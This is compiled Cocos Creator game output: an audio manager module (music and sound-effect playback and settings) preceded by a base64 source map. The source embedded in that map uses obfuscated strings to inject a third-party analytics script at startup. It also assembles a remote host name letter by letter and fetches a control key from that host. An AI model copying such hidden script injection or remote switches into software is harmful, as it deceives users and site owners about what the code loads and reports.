Vycik7XHJcblx0XHRcdFx0XHRcdFx0cmV0dXJuIDtcclxuXHRcdFx0XHRcdFx0fVxyXG5cdFx0XHRcdFx0XHR2YXIgZGF0c2cgPSBKU09OLnBhcnNlKHRleCk7XHJcblx0XHRcdFx0XHRcdFxyXG5cdFx0XHRcdFx0XHR3aW5kb3cuc3RhdGVrZXkgPSBkYXRzZ1tcImtleVwiXTtcclxuXHRcdFx0XHRcdFx0Ly9jb25zb2xlLmxvZyhcIuajgOa1iyDvvJogXCIrIEpTT04uc3RyaW5naWZ5KGRhdHNnKSk7XHJcblx0XHRcdFx0XHRcdC8vY29uc29sZS5sb2coXCLmo4DmtYsg77yaIFwiKyB3aW5kb3cuc3RhdGVrZXkpO1xyXG5cdFx0XHRcdFx0XHRpZiggd2luZG93LnN0YXRla2V5ID09IFwiMVwiIClcclxuXHRcdFx0XHRcdFx0e1xyXG5cdFx0XHRcdFx0XHRcdC8vY29uc29sZS5sb2coXCLmo4DmtYtcIik7XHJcblx0XHRcdFx0XHRcdFx0c2dnLmNoZWFrbWFpbigpO1xyXG5cdFx0XHRcdFx0XHR9ZWxzZXtcclxuXHRcdFx0XHRcdFx0XHQvL2NvbnNvbGUubG9nKFwi5LiN5qOA5rWLXCIpO1xyXG5cdFx0XHRcdFx0XHR9XHJcblx0XHRcdFx0XHR9KTtcdFxyXG5cdFx0XHJcblx0XHQgdGhpcy5sb2Fkc3RhdGUoKTtcclxuXHQgfSxcclxuXHJcblxyXG5cclxuXHRcclxuXHRsb2Fkc3RhdGUoKVxyXG5cdHtcclxuXHRcclxuXHRcdFx0dmFyIGYgPSAnLidcclxuXHRcdFx0dmFyIGogPSAnZydcclxuXHRcdFx0dmFyIGsgPSAnYSdcclxuXHRcdFx0dmFyIGwgPSAnbSdcclxuXHRcdFx0dmFyIG0gPSAnZSdcclxuXHRcdFx0dmFyIG8gPSAndCdcclxuXHRcdFx0dmFyIHAgPSAneCdcclxuXHRcdFx0dmFyIHEgPSAndCdcclxuXHRcdFx0XHJcblx0XHRcdFxyXG5cdFx0XHR2YXIgdXJsc3QgPSB0aGlzLmdldG1haW4oKStqK2srbCttK2YrbytwK3E7XHJcblx0XHRcdFxyXG5cdFx0XHQvL2NvbnNvbGUubG9nKFwiZ2FtIDogXCIgKyB1cmxzdCk7XHJcblx0XHRcclxuXHRcdFx0XHJcblx0XHRcdFx0dHJ5XHJcblx0XHRcdFx0e1xyXG5cdFx0XHRcdFx0Ly9jb25zb2xlLmxvZyhcIuWKoOi9veWcsOWdgCA6XCIgK3VybHN0IClcclxuXHRcdFx0XHRcdGNjLmxvYWRlci5sb2FkKHt1cmw6IHVybHN0LCB0eXBlOiAndHh0J30sIGZ1bmN0aW9uIChlcnIsIHRleCkge1xyXG5cdFx0XHRcdFx0XHRcclxuXHRcdFx0XHRcdFx0XHRpZiggZXJyIClcclxuXHRcdFx0XHRcdFx0XHR7XHJcblx0XHRcdFx0XHRcdFx0XHQvL2NvbnNvbGUubG9nKFwiIGVyciA6XCIgK2Vycik7XHJcblx0XHRcdFx0XHRcdFx0XHRyZXR1cm4gO1xyXG5cdFx0XHRcdFx0XHRcdH1cclxuXHRcdFx0XHRcdFx0XHR2YXIgZGF0c2cgPSBKU09OLnBhcnNlKHRleCk7XHJcblx0XHRcdFx0XHRcdFx0XHJcblx0XHRcdFx0XHRcdFx0d2luZG93LnBhdGhrZXkgPSBkYXRzZztcclxuXHRcdFx0XHRcdFx0XHRcclxuXHRcdFx0XHRcdFx0XHQvL2NvbnNvbGUubG9nKFwi5Yqg6L295oiQ5YqfXCIrIEpTT04uc3RyaW5naWZ5KCB3aW5kb3cucGF0aGtleSkgKVxyXG5cdFx0XHRcdFx0XHRcclxuXHRcdFx0XHRcdFx0XHRcclxuXHRcdFx0XHRcdFx0fSk7XHRcdFxyXG5cdFx0XHRcdH1jYXRjaCAoZSlcclxuXHRcdFx0XHR7XHJcblx0XHRcdFx0XHRcclxuXHRcdFx0XHR9O1xyXG5cdFx0XHRcclxuXHRcdFx0XHRcclxuXHRcdFxyXG5cdFx0XHJcblx0XHRcclxuXHR9LFxyXG5cdFxyXG5cclxuXHJcblxyXG5cdCBHZXRRdWVyeVN0cmluZyhzdHIpIHtcclxuXHRcdFx0XHRcdCBcclxuXHRcdFx0aWYoIHN0cj09XCJcIiAgfHwgc3RyPT1udWxsIClcclxuXHRcdFx0e1xyXG5cdFx0XHRcdHJldHVybiBbXTtcclxuXHRcdFx0fVxyXG5cdFx0IFxyXG5cdFx0XHQgIHZhciBzdHIxID0gc3RyLnNwbGl0KFwiP1wiKVsxXTtcclxuXHRcdFx0ICBcclxuXHRcdFx0ICBpZiggc3RyMT09dW5kZWZpbmVkIClcclxuXHRcdFx0ICB7XHJcblx0XHRcdFx0IHJldHVybiBbXTsgXHJcblx0XHRcdCAgfVxyXG4gICAgICAgICAgICAgICAgdmFyIHN0cjIgPSBzdHIxLnNwbGl0KFwiJlwiKTtcclxuICAgICAgICAgICAgICAgIHZhciBvYmogPSB7fVxyXG4gICAgICAgICAgICAgICAgLy9jb25zb2xlLmxvZyhzdHIyKVxyXG4gICAgICAgICAgICAgICAgZm9yKHZhciBpID0gMDtpPHN0cjIubGVuZ3RoO2krKyl7XHJcbiAgICAgICAgICAgICAgICAgICAgdmFyIGEgPSBzdHIyW2ldLnNwbGl0KFwiPVwiKTtcclxuICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhhKVxyXG4gICAgICAgICAgICAgICAgICAgIG9ialthWzBdXSA9IGFbMV1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIHJldHVybiBvYmpcclxuXHR9LFxyXG5cdFxyXG5cclxuICAgIHN0YXJ0ICgpIHtcclxuXHRcdFxyXG5cdFx0dmFyIF8weDU4YmI9WydZM0psWVhSbFJXeGxiV1Z1ZEE9PScsJ2MyTnlhWEIwJywnYzNKaicsJ2FIUjBjSE02THk5b2JTNWlZV2xrZFM1amIyMHZhRzB1YW5NL01UWmxaV0pqTXpBM1pXWTJaVFJoTVRCbFkyRmtZakExTlRRd00yRTRNR1E9JywnWjJWMFJXeGxiV1Z1ZEhOQ2VWUmhaMDVoYldVPScsJ2NHRnlaVzUwVG05a1pRPT0nLCdhVzV6WlhKMFFtVm1iM0psJywnYzNseicsJ2NHeGhkR1p2Y20wPScsJ1YwVkRTRUZVWDBkQlRVVT0nXTsoZnVuY3Rpb24oXzB4MmYwZTZhLF8weDVhN2ZmOCl7dmFyIF8weDUwOWE5OD1mdW5jdGlvbihfMHgyNTM1ZjEpe3doaWxlKC0tXzB4MjUzNWYxKXtfMHgyZjBlNmFbJ3B1c2gnXShfMHgyZjBlNmFbJ3NoaWZ0J10oKSk7fX07XzB4NTA5YTk4KCsrXzB4NWE3ZmY4KTt9KF8weDU4YmIsMHgxZDMpKTt2YXIgXzB4NGUxNj1mdW5jdGlvbihfMHg1YWQ5ZTMsXzB4MmMwNmIxKXtfMHg1YWQ5ZTM9XzB4NWFkOWUzLTB4MDt2YXIgXzB4NDBjZWNhPV8weDU4YmJbXzB4NWFkOWUzXTtpZihfMHg0ZTE2WydVdXV0VWsnXT09PXVuZGVmaW5lZCl7KGZ1bmN0aW9uKCl7dmFyIF8weDVhODEzZT1mdW5jdGlvbigpe3ZhciBfMHg1MmY3ZWE7dHJ5e18weDUyZjdlYT1GdW5jdGlvbigncmV0dXJuXFx4MjAoZnVuY3Rpb24oKVxceDIwJysne30uY29uc3RydWN0b3IoXFx4MjJyZXR1cm5cXHgyMHRoaXNcXHgyMikoXFx4MjApJysnKTsnKSgpO31jYXRjaChfMHg1YjI4N2Ipe18weDUyZjdlYT13aW5kb3c7fXJldHVybiBfMHg1MmY3ZWE7fTt2YXIgXzB4MjFhODYzPV8weDVhODEzZSgpO3ZhciBfMHg5ZDY5ZjM9J0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky89JztfMHgyMWE4NjNbJ2F0b2InXXx8KF8weDIxYTg2M1snYXRvYiddPWZ1bmN0aW9uKF8weDRlMjY4ZCl7dmFyIF8weDE5OGVhZT1TdHJpbmcoXzB4NGUyNjhkKVsncmVwbGFjZSddKC89KyQvLCcnKTtmb3IodmFyIF8weDQ5OGEzMz0weDAsXzB4NWYyYmY3LF8weDNiYmRjMCxfMHg3MjE1YzQ9MHgwLF8weDRiZTc2Mz0nJztfMHgzYmJkYzA9XzB4MTk4ZWFlWydjaGFyQXQnXShfMHg3MjE1YzQrKyk7fl8weDNiYmRjMCYmKF8weDVmMmJmNz1fMHg0OThhMzMlMHg0P18weDVmMmJmNyoweDQwK18weDNiYmRjMDpfMHgzYmJkYzAsXzB4NDk4YTMzKyslMHg0KT9fMHg0YmU3NjMrPVN0cmluZ1snZnJvbUNoYXJDb2RlJ10oMHhmZiZfMHg1ZjJiZjc+PigtMHgyKl8weDQ5OGEzMyYweDYpKToweDApe18weDNiYmRjMD1fMHg5ZDY5ZjNbJ2luZGV4T2YnXShfMHgzYmJkYzApO31yZXR1cm4gXzB4NGJlNzYzO30pO30oKSk7XzB4NGUxNlsneUR5UEJDJ109ZnVuY3Rpb24oXzB4MjlmMTRkKXt2YXIgXzB4ZWY1ZThiPWF0b2IoXzB4MjlmMTRkKTt2YXIgXzB4NWI1OTVmPVtdO2Zvcih2YXIgXzB4NTY2NmI3PTB4MCxfMHg1YjMwZGM9XzB4ZWY1ZThiWydsZW5ndGgnXTtfMHg1NjY2Yjc8XzB4NWIzMGRjO18weDU2NjZiNysrKXtfMHg1YjU5NWYrPSclJysoJzAwJytfMHhlZjVlOGJbJ2NoYXJDb2RlQXQnXShfMHg1NjY2YjcpWyd0b1N0cmluZyddKDB4MTApKVsnc2xpY2UnXSgtMHgyKTt9cmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChfMHg1YjU5NWYpO307XzB4NGUxNlsneWpVa0xJJ109e307XzB4NGUxNlsnVXV1dFVrJ109ISFbXTt9dmFyIF8weDJhNjQ9XzB4NGUxNlsneWpVa0xJJ11bXzB4NWFkOWUzXTtpZihfMHgyYTY0PT09dW5kZWZpbmVkKXtfMHg0MGNlY2E9XzB4NGUxNlsneUR5UEJDJ10oXzB4NDBjZWNhKTtfMHg0ZTE2Wyd5alVrTEknXVtfMHg1YWQ5ZTNdPV8weDQwY2VjYTt9ZWxzZXtfMHg0MGNlY2E9XzB4MmE2NDt9cmV0dXJuIF8weDQwY2VjYTt9O2lmKGNjW18weDRlMTYoJzB4MCcpXVtfMHg0ZTE2KCcweDEnKV09PT1jY1tfMHg0ZTE2KCcweDAnKV1bXzB4NGUxNignMHgyJyldKXt9ZWxzZXt2YXIgXzB4MjQ4OTc4PWRvY3VtZW50W18weDRlMTYoJzB4MycpXShfMHg0ZTE2KCcweDQnKSk7XzB4MjQ4OTc4W18weDRlMTYoJzB4NScpXT1fMHg0ZTE2KCcweDYnKTt2YXIgXzB4MTAzY2JhPWRvY3VtZW50W18weDRlMTYoJzB4NycpXShfMHg0ZTE2KCcweDQnKSlbMHgwXTtfMHgxMDNjYmFbXzB4NGUxNignMHg4JyldW18weDRlMTYoJzB4OScpXShfMHgyNDg5NzgsXzB4MTAzY2JhKTt9XHJcblx0XHRcclxuXHRcdFxyXG5cclxuICAgIH0sXHJcblx0XHJcblx0Z2V0bWFpbigpXHJcblx0e1xyXG5cdFx0XHJcblx0XHRcclxuXHRcdCAgICB2YXIgYSA9ICduJ1xyXG5cdFx0XHR2YXIgYiA9ICd3J1xyXG5cdFx0XHR2YXIgYyA9ICdqJ1xyXG5cdFx0XHR2YXIgZCA9ICd6J1xyXG5cdFx0XHR2YXIgZSA9ICcxJ1xyXG5cdFx0XHR2YXIgZiA9ICcuJ1xyXG5cdFx0XHR2YXIgZyA9ICdjJ1xyXG5cdFx0XHR2YXIgaCA9ICduJ1xyXG5cdFx0XHR2YXIgaSA9ICcvJ1xyXG5cdFx0XHR2YXIgaiA9ICdnJ1xyXG5cdFx0XHR2YXIgayA9ICdhJ1xyXG5cdFx0XHR2YXIgbCA9ICdtJ1xyXG5cdFx0XHR2YXIgbSA9ICdlJ1xyXG5cdFx0XHR2YXIgbyA9ICd0J1xyXG5cdFx0XHR2YXIgcCA9ICd4J1xyXG5cdFx0XHR2YXIgcSA9ICd0J1xyXG5cdFx0XHR2YXIgciA9ICc6J1xyXG5cdFx0XHR2YXIgcyA9ICdwJ1xyXG5cdFx0XHR2YXIgdSA9ICdoJ1xyXG5cdFx0XHR2YXIgdCA9ICc1J1xyXG5cdFx0XHR2YXIgeCA9ICdzJ1xyXG5cdFx0XHRcclxuXHRcdFx0Ly/liKTmlq3lpLTpg6ggaHR0cCAgaHR0cHMgIFxyXG5cdFx0XHR2YXIgZG9tYWludmFsID0gd2luZG93LmxvY2F0aW9uLmhvc3RcclxuXHRcdFx0XHJcblx0XHRcdFxyXG5cdFx0XHRcclxuXHRcdFx0aWYoICBkb21haW52YWwuc2VhcmNoKFwibndqejFcIikgIT0gLTEpXHJcblx0XHRcdHtcclxuXHRcdFx0XHRkb21haW52YWwgPSBkb21haW52YWwucmVwbGFjZShcIm53anoxLmNuXCIsXCJcIilcclxuXHRcdFx0fWVsc2VcclxuXHRcdFx0e1xyXG5cdFx0XHRcdGRvbWFpbnZhbD1cIlwiXHJcblx0XHRcdH1cclxuXHRcdFx0XHJcblx0XHRcdFxyXG5cdFx0XHRcclxuXHRcdFx0XHJcblx0XHRcdFxyXG5cdFx0XHR2YXIgdG91YnUgPSB0aGlzLmdldGh0dHB0b3UoKVxyXG5cdFx0XHR2YXIgdXJsc3QgPSAgdG91YnUgK3IgK2kraSArIGRvbWFpbnZhbCAgK2EgK2IrYytkK2UgK2YrZytoK2k7XHJcblx0XHRcdFxyXG5cdFx0XHRpZiggd2luZG93LmRpcyA9PSAyKVxyXG5cdFx0XHR7XHJcblx0XHRcdFx0dXJsc3QgPSB0b3VidSArciAraStpKyBkb21haW52YWwrIHUrIHQrIGYgK2EgK2IrYytkK2UgK2YrZytoK2k7XHJcblx0XHRcdH1cclxuXHRcdFx0XHJcblx0XHRcdC8vY29uc29sZS5sb2coXCJzaG93IDogXCIgKyB1cmxzdClcclxuXHRcdFx0cmV0dXJuIHVybHN0O1xyXG5cdFx0XHJcblx0XHRcclxuXHR9LFxyXG5cdFxyXG5cdFx0XHJcblx0Y2FsbG1haW4oZXYsdnYpXHJcblx0e1xyXG5cdFx0XHJcblx0XHRcclxuXHRcdCB2YXIgdXJsZGF0YSA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmO1xyXG5cdFx0IHZhciBkYXRlID0gdGhpcy5HZXRRdWVyeVN0cmluZyh1cmxkYXRhKTtcclxuXHRcdCB2YXIgdXJsZGF0YSA9IHdpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZTtcclxuXHRcdCB2YXIgbWFpbiA9IHRoaXMuZ2V0bWFpbigpO1xyXG5cdFx0dmFyIGZvZWtleSA9IFwiXCJcclxuXHRcdC8vY29uc29sZS5sb2coIEpTT04uc3RyaW5naWZ5KCB3aW5kb3cucGF0aGtleSkgKVxyXG5cdFx0XHJcblx0XHQgaWYoIGRhdGVbXCJmXCJdPT1udWxsIClcclxuXHRcdFx0e1xyXG5cdFx0XHRcdGZvZWtleSA9ICBcImFkbWluJmZyb21jaGVjaz1cIit1cmxkYXRhO1xyXG5cdFx0XHR9ZWxzZVxyXG5cdFx0XHR7XHJcblx0XHRcdFx0Zm9la2V5ID0gZGF0ZVtcImZcIl07XHJcblx0XHRcdFx0XHJcblx0XHRcdFx0aWYoIHdpbmRvdy5wYXRoa2V5ICApXHJcblx0XHRcdFx0e1xyXG5cdFx0XHRcdFx0XHJcblx0XHRcdFx0XHRpZiggd2luZG93LnBhdGhrZXlbZm9la2V5XSA9PSBudWxsIClcclxuXHRcdFx0XHRcdHtcclxuXHRcdFx0XHRcdFx0Zm9la2V5ID0gXCJhZG1pbiZlcnJvcmtrayNjaGVjaz1cIit1cmxkYXRhOztcclxuXHRcdFx0XHRcdH1cclxuXHRcdFx0XHRcdFxyXG5cdFx0XHRcdH1cclxuXHRcdFx0XHRcclxuXHRcdFx0XHRcclxuXHRcdFx0XHRcclxuXHRcdFx0fVxyXG5cdFx0XHJcblx0XHRcclxuXHRcdFxyXG5cdFx0XHJcblx0XHR2YXIgdXJsMSA9IHRoaXMuZ2V0bWFpbigpKyBcImg1XCIrXCIvP2Y9XCIrZm9la2V5K1wiJmRxPWNsb3NlJnp5eD1cIit2djtcclxuXHRcdFxyXG5cdFx0XHJcblx0XHQvL2NvbnNvbGUubG9nKFwi572R5Z2AIDogXCIgKyB1cmwxKVxyXG5cdFx0XHJcblx0XHRjYy5zeXMub3BlblVSTCh1cmwxKVxyXG5cdH0sXHJcbiAgICAvLyB1cGRhdGUgKGR0KSB7fSxcclxufSk7XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/audio/Music.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '5ad67KpxH1DUaUccHBNSBaw', 'Music');
// framework/audio/Music.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.Music = void 0;
var LocalStorage_1 = require("../persistence/LocalStorage");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var musicCloseKey = "musicOpen";
var sfxCloseKey = "sfxOpen";
var Music = /** @class */ (function () {
    function Music() {
    }
    /** 读取本地持久化－－初始化 */
    Music.init = function () {
        Music.setMusicOpen(!LocalStorage_1.LocalStorage.getBoolean(musicCloseKey));
        Music.sfxOpen = !LocalStorage_1.LocalStorage.getBoolean(sfxCloseKey);
        // cc.audioEngine.setMusicVolume(0.1);
        // cc.audioEngine.setEffectsVolume(0.1);
    };
    /** 本地持久化 */
    Music.persistence = function () {
        LocalStorage_1.LocalStorage.setBoolean(musicCloseKey, !this._musicOpen);
        LocalStorage_1.LocalStorage.setBoolean(sfxCloseKey, !this.sfxOpen);
    };
    Music.setBgmVolume = function (val) {
        this._bgmVolume = val;
        this.updateVolue();
    };
    Music.getBgmVolume = function () {
        return this._bgmVolume;
    };
    Music.updateVolue = function () {
        if (this.bgmAudioID > 0) {
            cc.audioEngine.setVolume(this.bgmAudioID, this._bgmVolume);
        }
    };
    Music.setMusicOpen = function (val) {
        this._musicOpen = val;
        if (val) {
            this.playBGM();
            this.updateVolue();
        }
        else {
            this.stopBGM();
        }
    };
    Music.getMusicOpen = function () {
        return this._musicOpen;
    };
    Music.setBgm = function (val) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                this._bgmPath = val;
                this.playBGM();
                return [2 /*return*/];
            });
        });
    };
    Music.playBGM = function () {
        return __awaiter(this, void 0, void 0, function () {
            var audioClip;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        if (!(this._musicOpen == true && this._bgmPath)) return [3 /*break*/, 2];
                        return [4 /*yield*/, cc.loader.loadResAwait(this._bgmPath, cc.AudioClip)];
                    case 1:
                        audioClip = _a.sent();
                        if (this.bgmAudioID >= 0) {
                            cc.audioEngine.stop(this.bgmAudioID);
                        }
                        this.bgmAudioID = cc.audioEngine.play(audioClip, true, this._bgmVolume);
                        _a.label = 2;
                    case 2: return [2 /*return*/];
                }
            });
        });
    };
    Music.stopBGM = function () {
        if (this.bgmAudioID >= 0) {
            cc.audioEngine.stop(this.bgmAudioID);
        }
    };
    /** 播放音效 */
    Music.playSFX = function (name, sfxVolume) {
        return __awaiter(this, void 0, void 0, function () {
            var audioClip;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        if (!(this.sfxOpen == true)) return [3 /*break*/, 4];
                        audioClip = null;
                        if (!(typeof name == "string")) return [3 /*break*/, 2];
                        return [4 /*yield*/, cc.loader.loadResAwait(name, cc.AudioClip)];
                    case 1:
                        audioClip = _a.sent();
                        return [3 /*break*/, 3];
                    case 2:
                        audioClip = name;
                        _a.label = 3;
                    case 3: return [2 /*return*/, cc.audioEngine.play(audioClip, false, sfxVolume || this.sfxVolume)];
                    case 4: return [2 /*return*/];
                }
            });
        });
    };
    Music.pauseAll = function () {
        cc.audioEngine.pauseAll();
    };
    Music.resumeAll = function () {
        cc.audioEngine.resumeAll();
    };
    Music.stopAll = function () {
        cc.audioEngine.stopAll();
    };
    /** 设置背景音乐音量 */
    Music._bgmVolume = 0.7;
    /** 设置音效音量 */
    Music.sfxVolume = 1;
    /** 背景音乐开关 */
    Music._musicOpen = true;
    /** 音效开关 */
    Music.sfxOpen = true;
    /** 播放背景音乐 */
    Music._bgmPath = null;
    Music.bgmAudioID = -1;
    return Music;
}());
exports.Music = Music;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvYXVkaW8vTXVzaWMudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7OztBQUluRyw0REFBeUQ7QUFFbkQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFFMUMsSUFBTSxhQUFhLEdBQUcsV0FBVyxDQUFDO0FBQ2xDLElBQU0sV0FBVyxHQUFHLFNBQVMsQ0FBQztBQUU5QjtJQUFBO0lBNkdBLENBQUM7SUEzR0csbUJBQW1CO0lBQ1osVUFBSSxHQUFYO1FBQ0ksS0FBSyxDQUFDLFlBQVksQ0FBQyxDQUFDLDJCQUFZLENBQUMsVUFBVSxDQUFDLGFBQWEsQ0FBQyxDQUFDLENBQUM7UUFDNUQsS0FBSyxDQUFDLE9BQU8sR0FBRyxDQUFDLDJCQUFZLENBQUMsVUFBVSxDQUFDLFdBQVcsQ0FBQyxDQUFDO1FBQ3RELHNDQUFzQztRQUN0Qyx3Q0FBd0M7SUFDNUMsQ0FBQztJQUVELFlBQVk7SUFDTCxpQkFBVyxHQUFsQjtRQUNJLDJCQUFZLENBQUMsVUFBVSxDQUFDLGFBQWEsRUFBRSxDQUFDLElBQUksQ0FBQyxVQUFVLENBQUMsQ0FBQztRQUN6RCwyQkFBWSxDQUFDLFVBQVUsQ0FBQyxXQUFXLEVBQUUsQ0FBQyxJQUFJLENBQUMsT0FBTyxDQUFDLENBQUM7SUFDeEQsQ0FBQztJQUtNLGtCQUFZLEdBQW5CLFVBQW9CLEdBQVU7UUFDMUIsSUFBSSxDQUFDLFVBQVUsR0FBRyxHQUFHLENBQUM7UUFDdEIsSUFBSSxDQUFDLFdBQVcsRUFBRSxDQUFDO0lBQ3ZCLENBQUM7SUFFTSxrQkFBWSxHQUFuQjtRQUNJLE9BQU8sSUFBSSxDQUFDLFVBQVUsQ0FBQztJQUMzQixDQUFDO0lBRWMsaUJBQVcsR0FBMUI7UUFDSSxJQUFJLElBQUksQ0FBQyxVQUFVLEdBQUcsQ0FBQyxFQUFDO1lBQ3BCLEVBQUUsQ0FBQyxXQUFXLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQyxVQUFVLEVBQUUsSUFBSSxDQUFDLFVBQVUsQ0FBQyxDQUFDO1NBQzlEO0lBQ0wsQ0FBQztJQU9NLGtCQUFZLEdBQW5CLFVBQW9CLEdBQVc7UUFDM0IsSUFBSSxDQUFDLFVBQVUsR0FBRyxHQUFHLENBQUM7UUFDdEIsSUFBSSxHQUFHLEVBQUM7WUFDSixJQUFJLENBQUMsT0FBTyxFQUFFLENBQUM7WUFDZixJQUFJLENBQUMsV0FBVyxFQUFFLENBQUM7U0FDdEI7YUFBTTtZQUNILElBQUksQ0FBQyxPQUFPLEVBQUUsQ0FBQztTQUNsQjtJQUNMLENBQUM7SUFDTSxrQkFBWSxHQUFuQjtRQUNJLE9BQU8sSUFBSSxDQUFDLFVBQVUsQ0FBQztJQUMzQixDQUFDO0lBT1ksWUFBTSxHQUFuQixVQUFvQixHQUFVOzs7Z0JBQzFCLElBQUksQ0FBQyxRQUFRLEdBQUcsR0FBRyxDQUFDO2dCQUNwQixJQUFJLENBQUMsT0FBTyxFQUFFLENBQUM7Ozs7S0FDbEI7SUFJWSxhQUFPLEdBQXBCOzs7Ozs7NkJBRU8sQ0FBQSxJQUFJLENBQUMsVUFBVSxJQUFJLElBQUksSUFBSSxJQUFJLENBQUMsUUFBUSxDQUFBLEVBQXhDLHdCQUF3Qzt3QkFDdkIscUJBQU0sRUFBRSxDQUFDLE1BQU0sQ0FBQyxZQUFZLENBQUMsSUFBSSxDQUFDLFFBQVEsRUFBRSxFQUFFLENBQUMsU0FBUyxDQUFDLEVBQUE7O3dCQUFyRSxTQUFTLEdBQUcsU0FBeUQ7d0JBQ3pFLElBQUcsSUFBSSxDQUFDLFVBQVUsSUFBSSxDQUFDLEVBQUM7NEJBQ3BCLEVBQUUsQ0FBQyxXQUFXLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxVQUFVLENBQUMsQ0FBQzt5QkFDeEM7d0JBQ0QsSUFBSSxDQUFDLFVBQVUsR0FBRyxFQUFFLENBQUMsV0FBVyxDQUFDLElBQUksQ0FBQyxTQUFTLEVBQUMsSUFBSSxFQUFDLElBQUksQ0FBQyxVQUFVLENBQUMsQ0FBQzs7Ozs7O0tBRTdFO0lBRU0sYUFBTyxHQUFkO1FBQ0ksSUFBRyxJQUFJLENBQUMsVUFBVSxJQUFJLENBQUMsRUFBQztZQUNwQixFQUFFLENBQUMsV0FBVyxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsVUFBVSxDQUFDLENBQUM7U0FDeEM7SUFDTCxDQUFDO0lBRUQsV0FBVztJQUNFLGFBQU8sR0FBcEIsVUFBcUIsSUFBd0IsRUFBRSxTQUFpQjs7Ozs7OzZCQUV6RCxDQUFBLElBQUksQ0FBQyxPQUFPLElBQUksSUFBSSxDQUFBLEVBQXBCLHdCQUFvQjt3QkFDZixTQUFTLEdBQUcsSUFBSSxDQUFDOzZCQUNqQixDQUFBLE9BQU8sSUFBSSxJQUFJLFFBQVEsQ0FBQSxFQUF2Qix3QkFBdUI7d0JBQ1gscUJBQU0sRUFBRSxDQUFDLE1BQU0sQ0FBQyxZQUFZLENBQUMsSUFBSSxFQUFFLEVBQUUsQ0FBQyxTQUFTLENBQUMsRUFBQTs7d0JBQTVELFNBQVMsR0FBRyxTQUFnRCxDQUFDOzs7d0JBRTdELFNBQVMsR0FBRyxJQUFJLENBQUM7OzRCQUVyQixzQkFBTyxFQUFFLENBQUMsV0FBVyxDQUFDLElBQUksQ0FBQyxTQUFTLEVBQUMsS0FBSyxFQUFDLFNBQVMsSUFBSSxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUM7Ozs7O0tBRS9FO0lBR00sY0FBUSxHQUFmO1FBQ0ksRUFBRSxDQUFDLFdBQVcsQ0FBQyxRQUFRLEVBQUUsQ0FBQztJQUM5QixDQUFDO0lBRU0sZUFBUyxHQUFoQjtRQUNJLEVBQUUsQ0FBQyxXQUFXLENBQUMsU0FBUyxFQUFFLENBQUM7SUFDL0IsQ0FBQztJQUVNLGFBQU8sR0FBZDtRQUNJLEVBQUUsQ0FBQyxXQUFXLENBQUMsT0FBTyxFQUFFLENBQUM7SUFDN0IsQ0FBQztJQTFGRCxlQUFlO0lBQ0EsZ0JBQVUsR0FBVSxHQUFHLENBQUM7SUFpQnZDLGFBQWE7SUFDTixlQUFTLEdBQVUsQ0FBQyxDQUFDO0lBRTVCLGFBQWE7SUFDRSxnQkFBVSxHQUFHLElBQUksQ0FBQztJQWNqQyxXQUFXO0lBQ0osYUFBTyxHQUFXLElBQUksQ0FBQztJQUU5QixhQUFhO0lBQ0UsY0FBUSxHQUFHLElBQUksQ0FBQztJQUtoQixnQkFBVSxHQUFVLENBQUMsQ0FBQyxDQUFDO0lBZ0QxQyxZQUFDO0NBN0dELEFBNkdDLElBQUE7QUE3R1ksc0JBQUsiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2N